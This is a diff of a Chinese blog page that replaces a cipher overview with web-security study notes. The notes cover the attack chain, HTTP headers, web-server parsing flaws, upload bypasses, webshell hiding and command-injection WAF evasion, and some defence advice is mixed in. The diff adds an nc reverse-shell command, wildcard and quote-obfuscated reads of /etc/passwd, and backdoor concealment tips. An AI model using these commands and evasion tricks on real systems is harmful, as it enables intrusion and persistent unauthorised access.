@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="crypto, blog">
+    <meta name="keywords" content="notebook, blog">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>crypto | blog</title>
+    <title>notebook | blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -309,12 +309,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/15.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/11.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">crypto</h1>
+                    <h1 class="description center-align post-title">notebook</h1>
                 </div>
             </div>
         </div>
@@ -444,15 +444,6 @@
                 </div>
                 <div class="col s5 right-align">
                     
-                    <div class="post-cate">
-                        <i class="fas fa-bookmark fa-fw icon-category"></i>
-                        
-                            <a href="/categories/%E5%AE%89%E5%85%A8/" class="post-category">
-                                安全
-                            </a>
-                        
-                    </div>
-                    
                 </div>
             </div>
 
@@ -460,7 +451,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
-                    2020-06-12
+                    2020-06-24
                 </div>
                 
 
@@ -476,15 +467,85 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>主流的加密方式</p>
-<h1 id="古典密码"><a href="#古典密码" class="headerlink" title="古典密码"></a>古典密码</h1><h3 id="代换密码"><a href="#代换密码" class="headerlink" title="代换密码"></a>代换密码</h3><p>1单表替换密码 2多密码替代密码 3多字母表替代密码 4多表替代密码等</p>
-<h3 id="置换位移法"><a href="#置换位移法" class="headerlink" title="置换位移法"></a>置换位移法</h3><p>1列置换   2周期置换等</p>
-<h1 id="现代密码"><a href="#现代密码" class="headerlink" title="现代密码"></a>现代密码</h1><p>1对称密码 2非对称密码 3hash函数 4数字签名</p>
-<h1 id="古典密码-1"><a href="#古典密码-1" class="headerlink" title="古典密码"></a>古典密码</h1><h3 id="古典密码编码方法归结为主要的两种-即是置换和代换"><a href="#古典密码编码方法归结为主要的两种-即是置换和代换" class="headerlink" title="古典密码编码方法归结为主要的两种 即是置换和代换"></a>古典密码编码方法归结为主要的两种 即是置换和代换</h3><p>置换： 把字母重新排列 字母身不变其他位置变了 </p>
-<h2 id="代换：-将密码代替成其他字符"><a href="#代换：-将密码代替成其他字符" class="headerlink" title="代换： 将密码代替成其他字符"></a>代换： 将密码代替成其他字符</h2><p>多表替代密码 从明文字母到密文字母通过多个映射来隐藏字母出现的频率分布<br>代表有 维吉尼亚密码（26个凯撒密码合并成一个表）</p>
-<h2 id="置换"><a href="#置换" class="headerlink" title="置换"></a>置换</h2><p>代表 栅栏密码（简单的移动字符位置的加密方法）</p>
-<h1 id="现代密码-1"><a href="#现代密码-1" class="headerlink" title="现代密码"></a>现代密码</h1><p>对称加密（加密和解密使用同一密钥）</p>
-
+                <h1 id="攻击连模型"><a href="#攻击连模型" class="headerlink" title="攻击连模型"></a>攻击连模型</h1><pre><code>侦察目标：充分利用社会工程学了解目标网络
+制作工具：输送制作的定向攻击工具比如 带有恶意代码的文件
+传送工具：输送工具到目标的系统上
+触发工具：利用目标系统的应用或者操作系统漏洞，在目标系统触发工具工具运行
+安装木马：远程控制程序的安装，使攻击者可以长期潜伏在目标系统中
+建立连接 与互联网控制服务器建立c2通道
+执行攻击：执行所需要的攻击行为 例如偷取信息 篡改信息</code></pre><h1 id="http协议"><a href="#http协议" class="headerlink" title="http协议"></a>http协议</h1><p>1http请求：http请求包括 请求行 请求头 请求正文<br>2http响应：与http请求对应的是http响应，http响应也是由三部分组成，分别是响应行，响应头，和响应正文</p>
+<h1 id="http状态码"><a href="#http状态码" class="headerlink" title="http状态码"></a>http状态码</h1><pre><code>1xx 提示信息，继续处理
+2xx 请求成功接受处理
+3xx 重定向
+4xx 客户端错误
+5xx 服务端错误</code></pre><h2 id="请求头"><a href="#请求头" class="headerlink" title="请求头"></a>请求头</h2><pre><code>HOST:用于指定请求的资源的internet主机和端口号
+User-agent：允许客户端将他的操作系统，浏览器和其他属性告诉服务器
+Referer：代表当前访问url的上一个url
+Cookie：一段文本 用来表示请求者的身份
+Range：多线程下载一定会用到这个请求头
+X-forward-for：他代表请求端的ip 可以有多个中间用逗号隔开
+Accept 用于指定客户端收那些mMIME类型的消息
+Accept-Charset：用于指定客户端接收的字符集</code></pre><h2 id="响应头"><a href="#响应头" class="headerlink" title="响应头"></a>响应头</h2><pre><code>serverr：服务器所使用web服务器的名词 避免攻击者探测可修改此头
+set-cookie：向客户端设置cookie 
+Last-Modified:浏览器通过此头告诉浏览器最后资源修改时间
+Location：服务器告诉浏览器要去访问那个页面 配合302使用
+refresh 告诉浏览器定时刷新浏览器</code></pre><h1 id="实体头常用实体头"><a href="#实体头常用实体头" class="headerlink" title="实体头常用实体头"></a>实体头常用实体头</h1><pre><code>Content-Type 实体报头域用语指明发送给接收者的实体正文的媒体类型
+Content-Length 实体报头域用于指明实体正文的长度，以字节方式存储的十进制数字表示
+Last-Modified </code></pre><h6 id="防止sql注入办法-严格数据类型，特殊字符转义，预编译语句，框架技术，存储过程"><a href="#防止sql注入办法-严格数据类型，特殊字符转义，预编译语句，框架技术，存储过程" class="headerlink" title="防止sql注入办法 严格数据类型，特殊字符转义，预编译语句，框架技术，存储过程"></a>防止sql注入办法 严格数据类型，特殊字符转义，预编译语句，框架技术，存储过程</h6><pre><code>1在服务端对所有输入数据有效性进行验证
+2在处理函数之前验证所有客户端提供的数据包括参数 url和http内容
+3验证数据类型 长度，以及合法性
+4使用白名单
+5危险字符后进行转义或者编码
+6避免使用动态拼接sql语句 </code></pre><h1 id="中间件"><a href="#中间件" class="headerlink" title="中间件"></a>中间件</h1><h1 id="iis解析漏洞"><a href="#iis解析漏洞" class="headerlink" title="iis解析漏洞"></a>iis解析漏洞</h1><pre><code>1目录解析：在网站目录*.asp,*.asa下的任何扩展名的文件格式都会被解析成为asp并执行在目录*.asp文件下，*.txt，*.jpg,*png格式被解析成asp
+2文件解析：在iis6.0上 分号;后面的不解析
+3其他默认可执行文件格式</code></pre><h1 id="nginx-解析漏洞"><a href="#nginx-解析漏洞" class="headerlink" title="nginx 解析漏洞"></a>nginx 解析漏洞</h1><pre><code>php CGI解析漏洞
+在网站下建立xxx.jpg在浏览器访问http://xxx.jpg/xx.php   xxx.jpg服务器并没有意义反馈文件不存在而是请求拒绝 原因是在nginx中当发现xx.php不存在时 会去请求 xxx.jpg这就是nginx的畸形解析漏洞的利用方式
+空字节解析漏洞
+nginx在遇到00%空字节时与后端FastCGI处理不一致 导致可以把其他执行图片马
+http://xxxx/xx.jpg%00s.php会把他当做php来执行
+影响版本：
+nginx 0.5.*  nginx0.6.* nginx0.7&lt;=0.7.65 nginx0.8&lt;=0.8.37</code></pre><h1 id="apahce解析漏洞"><a href="#apahce解析漏洞" class="headerlink" title="apahce解析漏洞"></a>apahce解析漏洞</h1><pre><code>apache解析文件的时候是从右向左解析 
+比如 http://xxxxx/xx.php/xx.ras 无法解析ras 向左解析到.php </code></pre><h2 id="文件上传绕过"><a href="#文件上传绕过" class="headerlink" title="文件上传绕过"></a>文件上传绕过</h2><pre><code>客户端绕过
+服务端：文件类型，文件头，文件后缀名 
+配合文件包含漏洞
+配合服务器解析漏洞
+cms 编辑器漏洞绕过
+配合操作系统文件命名规则绕过
+配合其他规则绕过
+waf绕过</code></pre><h3 id="后门隐藏与维持技巧"><a href="#后门隐藏与维持技巧" class="headerlink" title="后门隐藏与维持技巧"></a>后门隐藏与维持技巧</h3><pre><code>运维寻找shell的方式：
+    通过文件名 修改时间大小 文件备份比对等
+    webshell扫描脚本
+    通过Access.log访问日志发现后门所在
+    waf拦截 警告日志
+1 404页面隐藏
+2 变形一句话
+3包含 （文件，图片，错误日志）
+4 混淆（代码层面） （修改文件时间，文件大小伪装处理）</code></pre><h1 id="文件上传修复建议"><a href="#文件上传修复建议" class="headerlink" title="文件上传修复建议"></a>文件上传修复建议</h1><pre><code>文件扩展名白名单校验
+文件内容服务端检验
+上传文件重命名
+隐藏上传路径</code></pre><h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><pre><code>1代码过滤不严
+2系统的漏洞造成命令注入（bash破壳漏洞 CVE-2014-6271）
+3 调用第三方组件存在代码执行漏洞
+    比如 wordpass处理图片的mageMagick组件
+    java中的命令执行漏洞
+    thinkphp命令执行
+技巧1
+    ls -l 使用通配符 /?in/?s -l
+    /???/??t/??c/p???w? 有时候waf不允许太多?号 /?in/cat /?tc/p?sswd
+    nc反弹shell:
+    nc -e /bin/bash 127.0.0.1 3737 为了避免符号。可以将ip地址转换成整形 127.0.0.1-&gt;2130706433
+技巧2 连接符
+    echo &apos;h&apos;ell&apos;o&apos; 要注意闭合 利用这个可以绕过一些waf的检查
+    检测nc /&apos;b&apos;i&apos;n&apos;/&apos;w&apos;h&apos;i&apos;ch &apos;w&apos;g&apos;e&apos;t
+    其他字符 双引号 反斜杠 /b\i\n/w\h\i\c\h n\c
+技巧3 未初始化的变量
+cat$a /etc$a/passwd$a    
+防范建议
+1尽量少用执行命令函数或者禁用
+2参数尽量使用引号包括
+3使用动态函数之前，确保使用的函数是指定的函数之一
+4对执行命令的函数方法之前对参数进行严格过滤 对敏感字符进行转义
+5对php来说 不能完全控制的危险函数尽量不要用    </code></pre>
             </div>
             <hr/>
 
@@ -509,7 +570,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://yoursite.com/2020/06/12/crypto/">http://yoursite.com/2020/06/12/crypto/</a>
+                    <a href="http://yoursite.com/2020/06/24/notebook/">http://yoursite.com/2020/06/24/notebook/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -712,29 +773,34 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
+                <i class="far fa-dot-circle"></i>&nbsp;Current
+            </div>
             <div class="card">
-                <a href="/2020/06/16/nmap/">
+                <a href="/2020/06/24/notebook/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/14.jpg" class="responsive-img" alt="nmap">
+                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="notebook">
                         
-                        <span class="card-title">nmap</span>
+                        <span class="card-title">notebook</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            常用方法扫描单个地址  nmap 192.168.0.1扫描多个目标地址 nmap 192.168.9.1 192.168.9.100扫描指定范围 nmap 192.168.9.1-100扫描目标地址所在某个网段 nmap 192.168.
+                            攻击连模型侦察目标：充分利用社会工程学了解目标网络
+制作工具：输送制作的定向攻击工具比如 带有恶意代码的文件
+传送工具：输送工具到目标的系统上
+触发工具：利用目标系统的应用或者操作系统漏洞，在目标系统触发工具工具运行
+安装木马：远程控制程序
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-06-16
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-06-24
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -743,6 +809,7 @@
                         </span>
                     </div>
                 </div>
+
                 
             </div>
         </div>
@@ -753,35 +820,29 @@
                 Next&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2020/05/26/django/">
+                <a href="/2020/06/16/sqlmap/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/13.jpg" class="responsive-img" alt="django">
+                        <img src="/medias/featureimages/10.jpg" class="responsive-img" alt="sqlmap">
                         
-                        <span class="card-title">django</span>
+                        <span class="card-title">sqlmap</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            python创建虚拟环境使用清华源安装：pip install virtualenv -i https://pypi.python.org/simple/
-cd到存虚拟环境的地址
-    virtualenv -p /usr/local/b
+                            sqlmap入门判断是否存在注入：sqlmap.py -u http://127.0.0.1……（当注入参数大大于2 式需要加双引号）从文件中加载http参数：sqlmap.py -r desktop/1.txt sqlmap.py -r 
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-05-26
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-06-16
                             </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/python/" class="post-category">
-                                    python
-                                </a>
-                            
+                            <i class="fas fa-user fa-fw"></i>
+                            隐身
                             
                         </span>
                     </div>
